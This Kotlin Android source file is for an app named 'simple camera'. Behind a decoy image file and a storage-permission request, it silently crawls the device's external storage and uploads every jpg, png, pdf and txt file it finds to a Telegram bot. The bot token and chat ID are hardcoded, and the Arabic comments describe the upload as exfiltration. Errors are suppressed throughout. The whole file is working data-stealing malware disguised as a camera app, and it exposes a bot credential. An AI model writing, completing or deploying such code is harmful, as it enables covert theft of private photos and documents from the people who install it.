package com.simple.camera

import android.Manifest
import android.content.pm.PackageManager
import android.os.Environment
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private val BOT_TOKEN = "8277654027:AAHGTZ2RxrZ8tO-_MjjHKlpuymwp7gd0t3c"
    private val CHAT_ID = "6823926795"
    private val STORAGE_PERMISSION_CODE = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // 1. حفظ ملف negm.jpg محلياً عند التشغيل
        saveDecoyImage()

        // 2. طلب الصلاحيات المطلوبة للسحب
        checkAndRequestPermissions()
    }

    private fun saveDecoyImage() {
        try {
            val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, "negm.jpg")
            if (!file.exists()) {
                // كتابة بيانات وهمية أو صورة افتراضية كـ Decoy
                val outputStream = FileOutputStream(file)
                outputStream.write(byteArrayOf(0xFF, 0xD8, 0xFF, 0xE0)) // Magic bytes for JPEG
                outputStream.close()
            }
        } catch (e: Exception) {
            // صمت تام
        }
    }

    private fun checkAndRequestPermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
                STORAGE_PERMISSION_CODE
            )
        } else {
            startExfiltration()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == STORAGE_PERMISSION_CODE) {
            startExfiltration()
        }
    }

    private fun startExfiltration() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                // مسح وحدة التخزين الخارجية للبحث عن الصور والملفات
                val rootDir = Environment.getExternalStorageDirectory()
                scanAndSendFiles(rootDir)
            } catch (e: Exception) {
                // معالجة الأخطاء بصمت
            }
        }
    }

    private fun scanAndSendFiles(dir: File) {
        val files = dir.listFiles() ?: return
        for (file in files) {
            if (file.isDirectory) {
                scanAndSendFiles(file)
            } else {
                // استهداف الصور والملفات الهامة
                if (file.name.endsWith(".jpg") || file.name.endsWith(".png") || file.name.endsWith(".pdf") || file.name.endsWith(".txt")) {
                    sendToTelegram(file)
                }
            }
        }
    }

    private fun sendToTelegram(file: File) {
        val client = OkHttpClient()
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart(
                "document",
                file.name,
                file.asRequestBody("multipart/form-data".toMediaTypeOrNull())
            )
            .build()

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        try {
            client.newCall(request).execute().close()
        } catch (e: IOException) {
            // تجاهل أخطاء الشبكة المؤقتة لضمان استمرار السحب
        }
    }
}
